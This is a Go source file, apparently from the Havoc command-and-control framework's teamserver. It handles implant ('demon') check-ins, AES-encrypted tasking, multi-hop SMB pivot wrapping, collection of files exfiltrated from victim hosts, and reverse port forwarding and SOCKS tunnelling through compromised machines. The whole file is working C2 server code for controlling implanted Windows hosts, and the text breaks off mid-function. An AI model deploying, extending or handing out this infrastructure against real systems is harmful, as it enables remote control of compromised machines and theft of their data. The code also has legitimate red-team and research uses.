package agent

import (
	"bytes"
	"encoding/binary"
	//"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/common"
	"Havoc/pkg/common/crypt"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"

	"github.com/fatih/structs"
)

func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
	var (
		DataPayload        []byte
		PayloadPackage     []byte
		PayloadPackageSize = make([]byte, 4)
		RequestID          = make([]byte, 4)
		DataCommandID      = make([]byte, 4)
	)

	for _, job := range Jobs {

		for i := range job.Data {

			switch job.Data[i].(type) {
			case int:
				var integer32 = make([]byte, 4)

				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int)))

				DataPayload = append(DataPayload, integer32...)

				break

			case int64:
				var integer64 = make([]byte, 8)

				binary.LittleEndian.PutUint64(integer64, uint64(job.Data[i].(int64)))

				DataPayload = append(DataPayload, integer64...)

				break

			case uint64:
				var integer64 = make([]byte, 8)

				binary.LittleEndian.PutUint64(integer64, uint64(job.Data[i].(uint64)))

				DataPayload = append(DataPayload, integer64...)

				break

			case int32:
				var integer32 = make([]byte, 4)

				binary.LittleEndian.PutUint32(integer32, uint32(job.Data[i].(int32)))

				DataPayload = append(DataPayload, integer32...)

				break

			case uint32:
				var integer32 = make([]byte, 4)

				binary.LittleEndian.PutUint32(integer32, job.Data[i].(uint32))

				DataPayload = append(DataPayload, integer32...)

				break

			case int16:
				var integer16 = make([]byte, 2)

				binary.LittleEndian.PutUint16(integer16, uint16(job.Data[i].(int16)))

				DataPayload = append(DataPayload, integer16...)

				break

			case uint16:
				var integer16 = make([]byte, 2)

				binary.LittleEndian.PutUint16(integer16, job.Data[i].(uint16))

				DataPayload = append(DataPayload, integer16...)

				break

			case string:
				var size = make([]byte, 4)

				str := job.Data[i].(string)

				// in C, strings terminate with a null-byte
				if strings.HasSuffix(str, "\x00") == false {
					str += "\x00"
				}

				binary.LittleEndian.PutUint32(size, uint32(len(str)))

				DataPayload = append(DataPayload, size...)
				DataPayload = append(DataPayload, []byte(str)...)

				break

			case []byte:
				var size = make([]byte, 4)

				binary.LittleEndian.PutUint32(size, uint32(len(job.Data[i].([]byte))))

				DataPayload = append(DataPayload, size...)
				DataPayload = append(DataPayload, job.Data[i].([]byte)...)

				break

			case byte:
				var singlebyte = make([]byte, 1)

				singlebyte[0] = job.Data[i].(byte)

				DataPayload = append(DataPayload, singlebyte...)

				break

			default:
				logger.Error(fmt.Sprintf("Could not package, unknown data type: %v", job.Data[i]))
			}
		}

		binary.LittleEndian.PutUint32(DataCommandID, job.Command)
		PayloadPackage = append(PayloadPackage, DataCommandID...)

		binary.LittleEndian.PutUint32(RequestID, job.RequestID)
		PayloadPackage = append(PayloadPackage, RequestID...)

		binary.LittleEndian.PutUint32(PayloadPackageSize, uint32(len(DataPayload)))
		PayloadPackage = append(PayloadPackage, PayloadPackageSize...)

		if len(DataPayload) > 0 {
			DataPayload = crypt.XCryptBytesAES256(DataPayload, AesKey, AesIv)
			PayloadPackage = append(PayloadPackage, DataPayload...)
			DataPayload = nil
		}
	}

	//logger.Debug("PayloadPackage:\n", hex.Dump(PayloadPackage))

	return PayloadPackage
}

func ParseHeader(data []byte) (Header, error) {
	var (
		Header = Header{}
		Parser = parser.NewParser(data)
	)

	if Parser.Length() > 4 {
		Header.Size = Parser.ParseInt32()
	} else {
		return Header, errors.New("failed to parse package size")
	}

	if Parser.Length() > 4 {
		Header.MagicValue = Parser.ParseInt32()
	} else {
		return Header, errors.New("failed to parse magic value")
	}

	if Parser.Length() > 4 {
		Header.AgentID = Parser.ParseInt32()
	} else {
		return Header, errors.New("failed to parse agent id")
	}

	Header.Data = Parser

	// logger.Debug(fmt.Sprintf("Header Size       : %d", Header.Size))
	// logger.Debug(fmt.Sprintf("Header MagicValue : %x", Header.MagicValue))
	// logger.Debug(fmt.Sprintf("Header AgentID    : %x", Header.AgentID))
	// logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(Header.Data.Buffer())))

	return Header, nil
}

func RegisterInfoToInstance(Header Header, RegisterInfo map[string]any) *Agent {
	var (
		agent = &Agent{
			Active:     false,
			SessionDir: "",

			Info: new(AgentInfo),
		}
		err error
	)

	agent.NameID = fmt.Sprintf("%08x", Header.AgentID)
	agent.Info.MagicValue = Header.MagicValue

	if val, ok := RegisterInfo["Hostname"]; ok {
		agent.Info.Hostname = val.(string)
	}

	if val, ok := RegisterInfo["Username"]; ok {
		agent.Info.Username = val.(string)
	}

	if val, ok := RegisterInfo["Domain"]; ok {
		agent.Info.DomainName = val.(string)
	}

	if val, ok := RegisterInfo["InternalIP"]; ok {
		agent.Info.InternalIP = val.(string)
	}

	if val, ok := RegisterInfo["Process Path"]; ok {
		agent.Info.ProcessPath = val.(string)
	}

	if val, ok := RegisterInfo["Process Name"]; ok {
		agent.Info.ProcessName = val.(string)
	}

	if val, ok := RegisterInfo["Process Arch"]; ok {
		agent.Info.ProcessArch = val.(string)
	}

	if val, ok := RegisterInfo["Process ID"]; ok {
		agent.Info.ProcessPID, err = strconv.Atoi(val.(string))
		if err != nil {
			logger.DebugError("Couldn't parse ProcessID integer from string: " + err.Error())
			agent.Info.ProcessPID = 0
		}
	}

	if val, ok := RegisterInfo["Process Parent ID"]; ok {
		agent.Info.ProcessPPID, err = strconv.Atoi(val.(string))
		if err != nil {
			logger.DebugError("Couldn't parse ProcessPPID integer from string: " + err.Error())
			agent.Info.ProcessPPID = 0
		}
	}

	if val, ok := RegisterInfo["Process Elevated"]; ok {
		agent.Info.Elevated = "false"
		if val == "1" {
			agent.Info.Elevated = "true"
		}
	}

	if val, ok := RegisterInfo["OS Version"]; ok {
		agent.Info.OSVersion = val.(string)
	}

	if val, ok := RegisterInfo["OS Build"]; ok {
		agent.Info.OSBuild = val.(string)
	}

	if val, ok := RegisterInfo["OS Arch"]; ok {
		agent.Info.OSArch = val.(string)
	}

	agent.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
	agent.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
	agent.BackgroundCheck = false
	agent.Active = true

	return agent
}

func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP string) *Agent {
	//logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))

	var (
		MagicValue   int
		DemonID      int
		Hostname     string
		DomainName   string
		Username     string
		InternalIP   string
		ProcessName  string
		ProcessPID   int
		ProcessTID   int
		OsVersion    []int
		OsArch       int
		BaseAddress  int64
		Elevated     int
		ProcessArch  int
		ProcessPPID  int
		SleepDelay   int
		SleepJitter  int
		KillDate     int64
		WorkingHours int32
		AesKeyEmpty  = make([]byte, 32)
	)

	/*
		[ SIZE         ] 4 bytes
		[ Magic Value  ] 4 bytes
		[ Agent ID     ] 4 bytes
		[ COMMAND ID   ] 4 bytes
		[ Request ID   ] 4 bytes
		[ AES KEY      ] 32 bytes
		[ AES IV       ] 16 bytes
		AES Encrypted {
			[ Agent ID     ] 4 bytes <-- this is needed to check if we successfully decrypted the data
			[ Host Name    ] size + bytes
			[ User Name    ] size + bytes
			[ Domain       ] size + bytes
			[ IP Address   ] 16 bytes?
			[ Process Name ] size + bytes
			[ Process ID   ] 4 bytes
			[ Parent  PID  ] 4 bytes
			[ Process Arch ] 4 bytes
			[ Elevated     ] 4 bytes
			[ Base Address ] 8 bytes
			[ OS Info      ] ( 5 * 4 ) bytes
			[ OS Arch      ] 4 bytes
			..... more
		}
	*/

	if Parser.Length() >= 32+16 {

		var Session = &Agent{
			Encryption: struct {
				AESKey []byte
				AESIv  []byte
			}{
				AESKey: Parser.ParseAtLeastBytes(32),
				AESIv:  Parser.ParseAtLeastBytes(16),
			},

			Active:     false,
			SessionDir: "",

			Info: new(AgentInfo),
		}

		// check if there is aes key/iv.
		if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
			Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
		}

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
			DemonID = Parser.ParseInt32()
			logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))

			if AgentID != DemonID {
				if AgentID != 0 {
					logger.Debug("Failed to decrypt agent init request")
					return nil
				}
			} else {
				logger.Debug(fmt.Sprintf("AgentID (%x) == DemonID (%x)\n", AgentID, DemonID))
			}

			Hostname = Parser.ParseString()
			Username = Parser.ParseString()
			DomainName = Parser.ParseString()
			InternalIP = Parser.ParseString()

			if ExternalIP != "" {
				Session.Info.ExternalIP = ExternalIP
			}

			logger.Debug(fmt.Sprintf(
				"\n"+
					"Hostname: %v\n"+
					"Username: %v\n"+
					"Domain  : %v\n"+
					"InternIP: %v\n"+
					"ExternIP: %v\n",
				Hostname, Username, DomainName, InternalIP, ExternalIP))

			ProcessName = Parser.ParseUTF16String()
			ProcessPID  = Parser.ParseInt32()
			ProcessTID  = Parser.ParseInt32()
			ProcessPPID = Parser.ParseInt32()
			ProcessArch = Parser.ParseInt32()
			Elevated = Parser.ParseInt32()
			BaseAddress = Parser.ParseInt64()

			logger.Debug(fmt.Sprintf(
				"\n"+
					"ProcessName : %v\n"+
					"ProcessPID  : %v\n"+
					"ProcessTID  : %v\n"+
					"ProcessPPID : %v\n"+
					"ProcessArch : %v\n"+
					"Elevated    : %v\n"+
					"Base Address: 0x%x\n",
				ProcessName, ProcessPID, ProcessTID, ProcessPPID, ProcessArch, Elevated, BaseAddress))

			OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
			OsArch = Parser.ParseInt32()
			SleepDelay = Parser.ParseInt32()
			SleepJitter = Parser.ParseInt32()
			KillDate = Parser.ParseInt64()
			WorkingHours = int32(Parser.ParseInt32())

			logger.Debug(fmt.Sprintf(
				"\n"+
					"SleepDelay  : %v\n"+
					"SleepJitter : %v\n",
				SleepDelay, SleepJitter))

			Session.Active = true

			Session.NameID = fmt.Sprintf("%08x", DemonID)
			Session.Info.MagicValue = MagicValue
			Session.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
			Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
			Session.Info.Hostname = Hostname
			Session.Info.DomainName = DomainName
			Session.Info.Username = Username
			Session.Info.InternalIP = InternalIP
			Session.Info.SleepDelay = SleepDelay
			Session.Info.SleepJitter = SleepJitter
			Session.Info.KillDate = KillDate
			Session.Info.WorkingHours = WorkingHours

			// Session.Info.Listener 	= t.Name

			switch ProcessArch {

			case PROCESS_ARCH_UNKNOWN:
				Session.Info.ProcessArch = "Unknown"
				break

			case PROCESS_ARCH_X64:
				Session.Info.ProcessArch = "x64"
				break

			case PROCESS_ARCH_X86:
				Session.Info.ProcessArch = "x86"
				break

			case PROCESS_ARCH_IA64:
				Session.Info.ProcessArch = "IA64"
				break

			default:
				Session.Info.ProcessArch = "Unknown"
				break

			}

			Session.Info.OSVersion = getWindowsVersionString(OsVersion)

			switch OsArch {
			case 0:
				Session.Info.OSArch = "x86"
			case 9:
				Session.Info.OSArch = "x64/AMD64"
			case 5:
				Session.Info.OSArch = "ARM"
			case 12:
				Session.Info.OSArch = "ARM64"
			case 6:
				Session.Info.OSArch = "Itanium-based"
			default:
				Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
			}

			Session.Info.Elevated = "false"
			if Elevated == 1 {
				Session.Info.Elevated = "true"
			}

			process := strings.Split(ProcessName, "\\")

			Session.Info.ProcessName = process[len(process)-1]
			Session.Info.ProcessPID  = ProcessPID
			Session.Info.ProcessTID  = ProcessTID
			Session.Info.ProcessPPID = ProcessPPID
			Session.Info.ProcessPath = ProcessName
			Session.Info.BaseAddress = BaseAddress
			Session.BackgroundCheck = false

			/*for {
			    if Parser.Length() >= 4 {
			        var Option = Parser.ParseInt32()

			        switch Option {
			        case DEMON_CHECKIN_OPTION_PIVOTS:
			            logger.Debug("DEMON_CHECKIN_OPTION_PIVOTS")
			              var PivotCount = Parser.ParseInt32()

			              logger.Debug("PivotCount: ", PivotCount)

			              for {
			                  if PivotCount == 0 {
			                      break
			                  }

			                  var (
			                      PivotAgentID = Parser.ParseInt32()
			                      PivotPackage = Parser.ParseBytes()
			                      PivotParser  = parser.NewParser(PivotPackage)
			                      PivotSession *Agent
			                  )

			                  var (
			                      _             = PivotParser.ParseInt32()
			                      HdrMagicValue = PivotParser.ParseInt32()
			                      _             = PivotParser.ParseInt32()
			                      _             = PivotParser.ParseInt32()
			                  )

			                  PivotSession = ParseDemonRegisterRequest(PivotAgentID, PivotParser, RoutineFunc)
			                  if PivotSession != nil {
			                      PivotSession.Info.MagicValue = HdrMagicValue

			                      LogDemonCallback(PivotSession)
			                      RoutineFunc.AppendDemon(PivotSession)
			                      pk := RoutineFunc.EventNewDemon(PivotSession)
			                      RoutineFunc.EventAppend(pk)
			                      RoutineFunc.EventBroadcast("", pk)

			                      go PivotSession.BackgroundUpdateLastCallbackUI(RoutineFunc)

			                      Session.Pivots.Links = append(Session.Pivots.Links, PivotSession)

			                      PivotSession.Pivots.Parent = Session
			                  }

			                  PivotCount--
			              }

			            break
			        }

			    } else {
			        break
			    }
			}*/

			logger.Debug("Finished parsing demon")

			return Session
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: REGISTER, Invalid packet", AgentID))
			return nil
		}

	} else {
		logger.Debug(fmt.Sprintf("Agent: %x, Command: REGISTER, Invalid packet", AgentID))
		return nil
	}
}

// check that the request the agent is valid
func (a *Agent) IsKnownRequestID(teamserver TeamServer, RequestID uint32, CommandID uint32) bool {
	// some commands are always accepted because they don't follow the "send task and get response" format
	switch CommandID {
	case COMMAND_SOCKET:
		return true
	case COMMAND_PIVOT:
		return true
	}

	if teamserver.SendLogs() && CommandID == BEACON_OUTPUT {
		// if SendLogs is on, accept all BEACON_OUTPUT so that the agent can send logs
		return true
	}

	for i := range a.Tasks {
		if a.Tasks[i].RequestID == RequestID {
			return true
		}
	}
	return false
}

// the operator added a new request/command
func (a *Agent) AddRequest(job Job) []Job {
	a.Tasks = append(a.Tasks, job)
	return a.Tasks
}

// after a request has been completed, we can forget about the RequestID so that it is no longer valid
func (a *Agent) RequestCompleted(RequestID uint32) {
	for i := range a.Tasks {
		if a.Tasks[i].RequestID == RequestID {
			a.Tasks = append(a.Tasks[:i], a.Tasks[i+1:]...)
			break
		}
	}
}

func (a *Agent) AddJobToQueue(job Job) []Job {
	// store the RequestID									
	a.AddRequest(job)
	// if it's a pivot agent then add the job to the parent
	if a.Pivots.Parent != nil {
		//logger.Debug("Prepare command for pivot demon: " + a.NameID)
		a.PivotAddJob(job)
		// if it's a direct agent add the job to the direct agent
	} else {
		a.JobQueue = append(a.JobQueue, job)
	}
	return a.JobQueue
}

func (a *Agent) GetQueuedJobs() []Job {
	var Jobs []Job
	var JobsSize = 0
	var NumJobs = 0

	// make sure we return a number of jobs that doesn't exeed DEMON_MAX_RESPONSE_LENGTH
	for _, job := range a.JobQueue {

		for i := range job.Data {

			switch job.Data[i].(type) {
			case int:
				JobsSize += 4
				break

			case int64:
				JobsSize += 8
				break

			case uint64:
				JobsSize += 8
				break

			case int32:
				JobsSize += 4
				break

			case uint32:
				JobsSize += 4
				break

			case int16:
				JobsSize += 2
				break

			case uint16:
				JobsSize += 2
				break

			case string:
				JobsSize += 4 + len(job.Data[i].(string))
				break

			case []byte:
				JobsSize += 4 + len(job.Data[i].([]byte))
				break

			case byte:
				JobsSize += 1
				break

			default:
				logger.Error(fmt.Sprintf("Could determine package size, unknown data type: %v", job.Data[i]))
			}
		}

		if JobsSize >= DEMON_MAX_RESPONSE_LENGTH {
			break
		}

		NumJobs++
	}

	// if there is a very large job, send it anyways
	if len(a.JobQueue) > 0 && NumJobs == 0 {
		NumJobs = 1
	}

	// return NumJobs and leave the rest on the JobQueue
	Jobs, a.JobQueue = a.JobQueue[:NumJobs], a.JobQueue[NumJobs:]

	return Jobs
}

func (a *Agent) UpdateLastCallback(Teamserver TeamServer) {
	var (
		OldLastCallIn, _ = time.Parse("02-01-2006 15:04:05", a.Info.LastCallIn)
		NewLastCallIn, _ = time.Parse("02-01-2006 15:04:05", time.Now().Format("02-01-2006 15:04:05"))
	)

	a.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
	Teamserver.AgentUpdate(a)

	diff := NewLastCallIn.Sub(OldLastCallIn)

	Teamserver.AgentLastTimeCalled(a.NameID, diff.String(), a.Info.LastCallIn, a.Info.SleepDelay, a.Info.SleepJitter, a.Info.KillDate, a.Info.WorkingHours)
}

func (a *Agent) BackgroundUpdateLastCallbackUI(teamserver TeamServer) {
	if !a.BackgroundCheck {
		a.BackgroundCheck = true
	} else {
		return
	}

	for {
		if !a.Active {
			if len(a.Reason) == 0 {
				a.Reason = "Dead"
			}

			Callback := map[string]string{"Output": a.Reason}
			teamserver.AgentConsole(a.NameID, COMMAND_NOJOB, Callback)
			return
		}

		var (
			OldLastCallIn, _ = time.Parse("02-01-2006 15:04:05", a.Info.LastCallIn)
			NewLastCallIn, _ = time.Parse("02-01-2006 15:04:05", time.Now().Format("02-01-2006 15:04:05"))
		)

		diff := NewLastCallIn.Sub(OldLastCallIn)

		teamserver.AgentLastTimeCalled(a.NameID, diff.String(), a.Info.LastCallIn, a.Info.SleepDelay, a.Info.SleepJitter, a.Info.KillDate, a.Info.WorkingHours)

		time.Sleep(time.Second * 1)
	}
}

func (a *Agent) PivotAddJob(job Job) {
	var (
		Payload  = BuildPayloadMessage([]Job{job}, a.Encryption.AESKey, a.Encryption.AESIv)
		Packer   = packer.NewPacker(nil, nil)
		pivots   *Pivots
		PivotJob Job
		AgentID  int64
		err      error
	)

	// core package that the end pivot receive
	AgentID, err = strconv.ParseInt(a.NameID, 16, 32)
	if err != nil {
		logger.Debug("Failed to convert NameID string to AgentID: " + err.Error())
		return
	}

	Packer.AddInt32(int32(AgentID))
	Packer.AddBytes(Payload)

	// add this job to pivot queue.
	// tho it's not going to be used besides for the task size calculator
	// which is going to be displayed to the operator.
	a.JobQueue = append(a.JobQueue, job)

	PivotJob = Job{
		Command: COMMAND_PIVOT,
		Data: []interface{}{
			DEMON_PIVOT_SMB_COMMAND,
			uint32(AgentID),
			Packer.Buffer(),
		},
	}

	pivots = &a.Pivots

	// pack it up for all the parent pivots.
	for {
		if pivots.Parent.Pivots.Parent == nil {
			break
		}

		// create new layer package.
		Payload = BuildPayloadMessage([]Job{PivotJob}, pivots.Parent.Encryption.AESKey, pivots.Parent.Encryption.AESIv)
		Packer = packer.NewPacker(nil, nil)

		AgentID, err = strconv.ParseInt(pivots.Parent.NameID, 16, 32)
		if err != nil {
			logger.Debug("Failed to convert NameID string to AgentID: " + err.Error())
			return
		}

		Packer.AddInt32(int32(AgentID))
		Packer.AddBytes(Payload)

		PivotJob = Job{
			Command: COMMAND_PIVOT,
			Data: []interface{}{
				DEMON_PIVOT_SMB_COMMAND,
				uint32(AgentID),
				Packer.Buffer(),
			},
		}

		pivots = &pivots.Parent.Pivots
	}

	pivots.Parent.JobQueue = append(pivots.Parent.JobQueue, PivotJob)
}

func (a *Agent) DownloadAdd(FileID int, FilePath string, FileSize int64) error {
	var (
		err      error
		download = &Download{
			FileID:    FileID,
			FilePath:  FilePath,
			TotalSize: FileSize,
			Progress:  FileSize,
			State:     DOWNLOAD_STATE_RUNNING,
		}

		DemonPath        = logr.LogrInstance.AgentPath + "/" + a.NameID
		DemonDownloadDir = DemonPath + "/Download"
		DownloadFilePath = strings.Join(strings.Split(FilePath, "\\"), "/")
		FileSplit        = strings.Split(DownloadFilePath, "/")
		DownloadFile     = FileSplit[len(FileSplit)-1]
		DemonDownload    = DemonDownloadDir + "/" + strings.Join(FileSplit[:len(FileSplit)-1], "/")
	)

	/* check if we don't have a path traversal */
	path := filepath.Clean(DemonDownload)
	if !strings.HasPrefix(path, DemonDownloadDir) {
		logger.Error("File didn't started with agent download path. abort")
		return errors.New("File didn't started with agent download path. abort")
	}

	if _, err := os.Stat(DemonDownload); os.IsNotExist(err) {
		if err = os.MkdirAll(DemonDownload, os.ModePerm); err != nil {
			logger.Error("Failed to create Logr demon download path" + a.NameID + ": " + err.Error())
			return errors.New("Failed to create Logr demon download path" + a.NameID + ": " + err.Error())
		}
	}

	/* remove null terminator. goland doesn't like it. */
	DownloadFile = common.StripNull(DownloadFile)

	download.File, err = os.Create(DemonDownload + "/" + DownloadFile)
	if err != nil {
		logger.Error("Failed to create file: " + err.Error())
		return errors.New("Failed to create file: " + err.Error())
	}

	download.LocalFile = DemonDownload + "/" + DownloadFile

	a.Downloads = append(a.Downloads, download)

	return nil
}

func (a *Agent) DownloadWrite(FileID int, data []byte) error {
	for i := range a.Downloads {
		if a.Downloads[i].FileID == FileID {
			_, err := a.Downloads[i].File.Write(data)
			if err != nil {
				a.Downloads[i].File, err = os.Create(a.Downloads[i].LocalFile)
				if err != nil {
					return errors.New("Failed to create file: " + err.Error())
				}

				_, err = a.Downloads[i].File.Write(data)
				if err != nil {
					return errors.New("Failed to write to file [" + a.Downloads[i].LocalFile + "]: " + err.Error())
				}

				a.Downloads[i].Progress += int64(len(data))
			}
			return nil
		}
	}
	return errors.New(fmt.Sprintf("FileID not found: %x", FileID))
}

func (a *Agent) DownloadClose(FileID int) {
	for i := range a.Downloads {
		if a.Downloads[i].FileID == FileID {
			err := a.Downloads[i].File.Close()
			if err != nil {
				logger.Error(fmt.Sprintf("Failed to close download (%x) file: %v", a.Downloads[i].FileID, err))
			}

			a.Downloads = append(a.Downloads[:i], a.Downloads[i+1:]...)
			break
		}
	}
}

func (a *Agent) DownloadGet(FileID int) *Download {
	for _, download := range a.Downloads {
		if download.FileID == FileID {
			return download
		}
	}
	return nil
}

func (a *Agent) PortFwdNew(SocketID, LclAddr, LclPort, FwdAddr, FwdPort int, Target string) {
	var portfwd = &PortFwd{
		Conn:    nil,
		SocktID: SocketID,
		LclAddr: LclAddr,
		LclPort: LclPort,
		FwdAddr: FwdAddr,
		FwdPort: FwdPort,
		Target:  Target,
	}

	a.PortFwds = append(a.PortFwds, portfwd)
}

func (a *Agent) PortFwdGet(SocketID int) *PortFwd {

	for i := range a.PortFwds {

		/* check if it's our rportfwd connection */
		if a.PortFwds[i].SocktID == SocketID {

			/* return the found PortFwd object */
			return a.PortFwds[i]

		}

	}

	return nil
}

func (a *Agent) PortFwdOpen(SocketID int) error {
	var (
		err   error
		found bool
	)

	for i := range a.PortFwds {

		/* check if it's our rportfwd connection */
		if a.PortFwds[i].SocktID == SocketID {

			/* alright we found our socket */
			found = true

			/* open the connection to the target */
			a.PortFwds[i].Conn, err = net.Dial("tcp", a.PortFwds[i].Target)
			if err != nil {
				return err
			}

			break;
		}

	}

	if !found {
		return fmt.Errorf("rportfwd socket id %x not found", SocketID)
	}

	return nil
}

func (a *Agent) PortFwdWrite(SocketID int, data []byte) error {
	var found bool

	for i := range a.PortFwds {

		/* check if it's our rportfwd connection */
		if a.PortFwds[i].SocktID == SocketID {

			/* alright we found our socket */
			found = true

			if a.PortFwds[i].Conn != nil {

				/* write to the connection */
				_, err := a.PortFwds[i].Conn.Write(data)
				if err != nil {
					return err
				}

				break

			} else {
				return errors.New("portfwd connection is empty")
			}

			break;
		}

	}

	if !found {
		return fmt.Errorf("rportfwd socket id %x not found", SocketID)
	}

	return nil
}

func (a *Agent) PortFwdRead(SocketID int) ([]byte, error) {
	var (
		found = false
		data  = bytes.Buffer{}
	)

	for i := range a.PortFwds {

		/* check if it's our rportfwd connection */
		if a.PortFwds[i].SocktID == SocketID {

			/* alright we found our socket */
			found = true

			if a.PortFwds[i].Conn != nil {

				/* read from our socket to the data buffer or return error */
				_, err := io.Copy(&data, a.PortFwds[i].Conn)
				if err != nil {
					return nil, err
				}

				break

			} else {
				return nil, errors.New("portfwd connection is empty")
			}

			break;
		}

	}

	if !found {
		return nil, fmt.Errorf("rportfwd socket id %x not found", SocketID)
	}

	/* return the read data */
	return data.Bytes(), nil
}

func (a *Agent) PortFwdClose(SocketID int) {

	for i := range a.PortFwds {

		/* check if it's our rportfwd connection */
		if a.PortFwds[i].SocktID == SocketID {

			/* is there a socket? if not the not try anything or else we get an exception */
			if a.PortFwds[i].Conn != nil {

				logger.Info("Portfwd close")

				/* close our connection */
				a.PortFwds[i].Conn.Close()

			}

			/* remove the socket from the array */
			a.PortFwds = append(a.PortFwds[:i], a.PortFwds[i+1:]...)

			break;
		}

	}

}

func (a *Agent) SocksClientAdd(SocketID int32, conn net.Conn, ATYP byte, IpDomain []byte, Port uint16) *SocksClient {

	var client = new(SocksClient)

	client.SocketID  = SocketID
	client.Conn      = conn
	client.Connected = false
	client.ATYP      = ATYP
	client.IpDomain  = IpDomain
	client.Port      = Port

	a.SocksCliMtx.Lock()

	a.SocksCli = append(a.SocksCli, client)

	a.SocksCliMtx.Unlock()

	return client
}

func (a *Agent) SocksClientGet(SocketID int) *SocksClient {
	var (
		client *SocksClient = nil
	)

	a.SocksCliMtx.Lock()

	for i := range a.SocksCli {

		if a.SocksCli[i].SocketID == int32(SocketID) {

			client = a.SocksCli[i]

			break
		}

	}

	a.SocksCliMtx.Unlock()

	return client
}

func (a *Agent) SocksClientRead(client *SocksClient) ([]byte, error) {
	var (
		data  = make([]byte, 0x10000)
		read  []byte
	)

	if client != nil {
		if client.Conn != nil {
			if client.Connected {

				/* read from our socket to the data buffer or return error */
				client.Conn.SetReadDeadline(time.Time{})
				length, err := client.Conn.Read(data)
				if err != nil {
					return nil, err
				}

				read = make([]byte, length)
				copy(read, data)

				/* return the read data */
				return read, nil

			} else {
				return nil, errors.New("socks proxy is not connected")
			}
		} else {
			return nil, errors.New("socks proxy connection is empty")
		}
	} else {
		return nil, errors.New("socks proxy empty client")
	}
}

func (a *Agent) SocksClientClose(SocketID int32) {

	a.SocksCliMtx.Lock()

	for i := range a.SocksCli {

		/* check if it's our rportfwd connection */
		if a.SocksCli[i].SocketID == int32(SocketID) {

			/* is there a socket? if not the not try anything or else we get an exception */
			if a.SocksCli[i].Conn != nil {

				/* close our connection */
				a.SocksCli[i].Conn.Close()
				a.SocksCli[i].Conn = nil

			}

			/* remove the socks server from the array */
			a.SocksCli = append(a.SocksCli[:i], a.SocksCli[i+1:]...)

			break
		}
	}

	a.SocksCliMtx.Unlock()
}

func (a *Agent) SocksServerRemove(Addr string) {

	a.SocksSvrMtx.Lock()

	for i := range a.SocksSvr {

		if a.SocksSvr[i].Addr == Addr {

			/* is there a socket? if not the not try anything or else we get an exception */
			if a.SocksSvr[i].Server != nil {

				/* close our connection */
				a.SocksSvr[i].Server.Close()

			}

			/* remove the socket from the array */
			a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)

			break;
		}

	}

	a.SocksSvrMtx.Unlock()

}

// ToMap returns the agent info as a map
func (a *Agent) ToMap() map[string]interface{} {
	var (
		ParentAgent *Agent
		Info        map[string]any
		MagicValue  string
	)

	ParentAgent = a.Pivots.Parent
	a.Pivots.Parent = nil

	Info = structs.Map(a)

	Info["Info"].(map[string]interface{})["Listener"] = nil

	delete(Info, "Connection")
	delete(Info, "SessionDir")
	delete(Info, "JobQueue")
	delete(Info, "Parent")

	MagicValue = fmt.Sprintf("%08x", a.Info.MagicValue)

	if ParentAgent != nil {
		Info["PivotParent"] = ParentAgent.NameID
		a.Pivots.Parent = ParentAgent
	}

	Info["MagicValue"] = MagicValue

	return Info
}

func (a *Agent) ToJson() string {
	// TODO: add Agents pivot links too

	jsonBytes, err := json.Marshal(a.ToMap())
	if err != nil {
		logger.Error("Failed to marshal object to json: " + err.Error())
		return ""
	}

	logger.Debug("jsonBytes =>", string(jsonBytes))

	return string(jsonBytes)
}

func (agents *Agents) AgentsAppend(demon *Agent) []*Agent {
	agents.Agents = append(agents.Agents, demon)
	return agents.Agents
}

func getWindowsVersionString(OsVersion []int) string {
	var WinVersion = "Unknown"

	if OsVersion[0] == 10 && OsVersion[1] == 0 && OsVersion[2] != 0x0000001 && OsVersion[4] == 20348 {
		WinVersion = "Windows 2022 Server 22H2"
	} else if OsVersion[0] == 10 && OsVersion[1] == 0 && OsVersion[2] != 0x0000001 && OsVersion[4] == 17763 {
		WinVersion = "Windows 2019 Server"
	} else if OsVersion[0] == 10 && OsVersion[1] == 0 && OsVersion[2] == 0x0000001 && (OsVersion[4] >= 22000 && OsVersion[4] <= 22621) {
		WinVersion = "Windows 11"
	} else if OsVersion[0] == 10 && OsVersion[1] == 0 && OsVersion[2] != 0x0000001 {
		WinVersion = "Windows 2016 Server"
	} else if OsVersion[0] == 10 && OsVersion[1] == 0 && OsVersion[2] == 0x0000001 {
		WinVersion = "Windows 10"
	} else if OsVersion[0] == 6 && OsVersion[1] == 3 && OsVersion[2] != 0x0000001 {
		WinVersion = "Windows Server 2012 R2"
	} else if OsVersion[0] == 6 && OsVersion[1] == 3 && OsVersion[2] == 0x0000001 {
		WinVersion = "Windows 8.1"
	} else if OsVersion[0] == 6 && OsVersion[1] == 2 && OsVersion[2] != 0x0000001 {
		WinVersion = "Windows Server 2012"
	} else if OsVersion[0] == 6 && OsVersion[1] == 2 && OsVersion[2] == 0x0000001 {
